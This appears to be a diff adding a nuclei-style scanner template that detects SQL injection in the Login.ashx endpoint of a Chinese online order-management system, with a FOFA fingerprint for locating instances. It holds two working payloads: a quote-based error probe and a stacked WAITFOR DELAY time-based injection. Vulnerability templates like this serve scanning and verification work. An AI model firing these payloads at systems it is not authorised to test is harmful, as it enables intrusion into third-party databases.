@@ -1,0 +1,57 @@
+id: poc-yaml-tutor-ooms-login-ashx-sqli
+info:
+  name: 杜特网上订单管理系统 Login.ashx SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    finger: 杜特网上订单管理系统
+    fofa: app="TUTORSOFT-ERP"
+
+variables:
+  t1: "{{rand_int(4,9)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        POST /ajax/Login.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        LoginCode=1'&Password=1&ckRemember=0
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "附近有语法错误"
+          - "引号不完整"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+
+  - raw:
+      - |
+        POST /ajax/Login.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        LoginCode=1';WAITFOR+DELAY+'0:0:{{t1}}'--&Password=1&ckRemember=0
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Error:账号不存在"
+        part: body
+      - type: word
+        words:
+          - "<"
+        part: body
+        negative: true
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
